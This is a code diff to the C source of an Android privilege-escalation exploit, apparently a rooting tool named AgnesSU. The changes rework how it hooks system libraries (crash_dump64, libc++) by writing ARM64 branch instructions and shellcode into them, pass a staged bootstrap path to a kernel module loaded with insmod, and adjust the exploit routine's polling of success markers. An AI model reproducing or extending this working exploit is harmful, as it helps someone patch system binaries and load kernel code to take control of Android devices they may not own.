@@ -17,12 +17,16 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 
+#define eos(s) (s + strlen(s))
+
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
-static char    *libcxx_bootstrap;
+static char    *libcxx_bootstrap_opt;
 
-/* Runtime bootstrap path, supplied via --bootstrap-path for spoofed/renamed
- * builds. When empty, the ko's compiled-in default path is used unchanged. */
+/* AgnesSU: runtime bootstrap path. It is written into the shellcode's
+ * "bootstrap=<path>" slot and passed to the ko as an insmod module parameter,
+ * so a spoofed/renamed applicationId resolves its own staged bootstrap.
+ * Empty means "keep the compiled-in default". */
 static char g_bootstrap_path[256];
 static const char kDefaultBootstrap[] = "/data/user_de/0/com.agnessu.yakayn/bootstrap";
 
@@ -310,7 +314,21 @@ static int read_device_versions(int *andr, int *major, int *minor) {
     if (uname(&u) != 0) return -1;
     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
     const char *m = strstr(u.release, "android");
-    if (!m) return -1;
+    if (!m) {
+        printf("uname -r is missing Android version, trying getprop\n");
+
+        char vendor_ver[5];
+        char release[15];
+
+        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
+        fgets(vendor_ver, sizeof(vendor_ver), f);
+        pclose(f);
+
+        sprintf(release, "android");
+        sprintf(eos(release), "%s", vendor_ver);
+
+        m = release;
+    }
     *andr = atoi(m + 7);
     return (*andr > 0) ? 0 : -1;
 }
@@ -384,29 +402,14 @@ static void cleanup(void) {
 }
 
 int find_hook_target(const char *lib, const char *sym,
-                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn);
+                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
+                     size_t shellcode_size);
 
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
                       char *first_inst_copy, struct PatchRestore *restore) {
-    uint64_t hook_off, shell_off; uint32_t first_insn;
-    printf("Finding symbol offsets for %s:\n", lib);
-    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
-        printf("failed to find offsets for %s\n", lib); return 1;
-    }
-    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
-
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
-    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
-
-    if (first_insn == hook_insn) {
-        printf("%s already patched\n", lib); return 0;
-    }
-    uint32_t jmpback = BRANCH |
-        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
-    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
-    *(uint32_t *)&first_inst_copy[0] = first_insn;
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
@@ -415,6 +418,23 @@ static int patch_hook(const char *lib, const char *sym,
         printf("shellcode too large to save (%zu)\n", padded);
         free(buf); return -1;
     }
+
+    uint64_t hook_off, shell_off; uint32_t first_insn;
+    printf("Finding symbol offsets for %s:\n", lib);
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
+        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
+    }
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+
+    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+
+    if (first_insn == hook_insn) {
+        printf("%s already patched\n", lib); free(buf); return 0;
+    }
+    uint32_t jmpback = BRANCH |
+        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+    *(uint32_t *)&buf[stage_len - 4] = jmpback;
+    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
     uint64_t aligned = hook_off & ~(uint64_t)15;
     int fd = open(lib, O_RDONLY);
@@ -526,11 +546,15 @@ static int setup(int argc, char **argv) {
     strncpy(libcxx_ko_target, ko_target, 63);
     libcxx_ko_target[63] = '\0';
 
-    libcxx_bootstrap = libcxx_data + libcxx_bootstrap_off;
-    if (g_bootstrap_path[0] && strcmp(g_bootstrap_path, kDefaultBootstrap) != 0) {
-        memset(libcxx_bootstrap, 0, 256);
-        strncpy(libcxx_bootstrap, g_bootstrap_path, 255);
-        printf("patch: bootstrap path -> %s\n", g_bootstrap_path);
+    libcxx_bootstrap_opt = libcxx_data + libcxx_bootstrap_off;
+    {
+        const char *bp = g_bootstrap_path[0] ? g_bootstrap_path : kDefaultBootstrap;
+        int n = snprintf(libcxx_bootstrap_opt, 256, "bootstrap=%s", bp);
+        if (n < 0 || n >= 256) {
+            printf("bootstrap path too long: %s\n", bp);
+            return 2;
+        }
+        printf("bootstrap: %s\n", bp);
     }
 
     printf("=== setup ===\n");
@@ -553,7 +577,7 @@ static int exploit(void) {
 
     rc = 2;
     usleep(500000);
-
+    
     printf("\n=== init  ===\n");
     createOrphanProcess();
 
@@ -578,7 +602,7 @@ static int exploit(void) {
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-    for (int elapsed = 0; elapsed < 7000; elapsed += 10) {
+    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
@@ -589,8 +613,6 @@ static int exploit(void) {
         }
     }
     printf("timeout: ERROR - check logcat & dmesg\n");
-    for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++)
-        if (seen[j]) printf("  reached: %s\n", markers[j].msg);
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
     return rc;
